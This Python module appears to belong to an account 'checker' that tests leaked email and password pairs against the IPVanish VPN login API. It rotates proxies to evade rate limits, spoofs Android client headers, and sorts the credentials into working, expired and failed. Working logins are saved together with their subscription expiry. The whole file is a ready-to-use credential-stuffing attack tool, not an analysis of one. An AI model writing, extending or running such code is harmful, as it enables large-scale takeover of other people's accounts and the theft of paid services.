from modules.variables import Checker
from modules.functions import bad_proxy, log, return_proxy,save,set_proxy,get_number
from requests import Session
from uuid import uuid4
from datetime import datetime
from requests.adapters import HTTPAdapter, Retry
import functools

def check(email:str,password:str):
    while not Checker.stopping:
        try:
            proxy = set_proxy()
            proxy_set = set_proxy(proxy)

            with Session() as s:
                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))

                data = {
                    "api_key": "15cb936e6d19cd7db1d6f94b96017541",
                    "client": f"Android-3.4.6.7.{get_number(100000000,1000000000)}",
                    "os": "30",
                    "password": password,
                    "username": email,
                    "uuid": str(uuid4())
                }
                headers = {
                    "Content-Type": "application/json",
                    "X-Client": "ipvanish",
                    "X-Client-Version": "1.2.",
                    "X-Platform": "Android",
                    "Connection": "Keep-Alive",
                    "User-Agent": "okhttp/3.12.0",
                    "Accept-Encoding": "gzip, deflate"
                }
                response = s.post("https://api.ipvanish.com/api/v3/login",json=data, headers=headers)
                if "The username or password provided is incorrect" in response.text or "failed attempts" in response.text:
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                elif "account_type" not in response.text:
                    raise

                expiry = datetime.utcfromtimestamp(response.json()["sub_end_epoch"]).strftime('%Y-%m-%d')
                expire = int(datetime.utcfromtimestamp(response.json()["sub_end_epoch"]).strftime('%Y%m%d'))
                now_time = int(datetime.now().strftime('%Y%m%d'))
                if now_time > expire:
                    Checker.custom += 1
                    return_proxy(proxy)
                    if not Checker.cui: log("custom",":".join([email,password]),"Ipvanish")
                    save("Ipvanish","custom",Checker.time,":".join([email,password]))
                    return
                else:
                    Checker.good += 1
                    return_proxy(proxy)
                    if not Checker.cui: log("good",":".join([email,password]),"Ipvanish")
                    save("Ipvanish","good",Checker.time,":".join([email,password])+f" | Expire: {expiry}")
                    return
        except:
            bad_proxy(proxy)
            return_proxy(proxy)
            Checker.errors += 1
        
        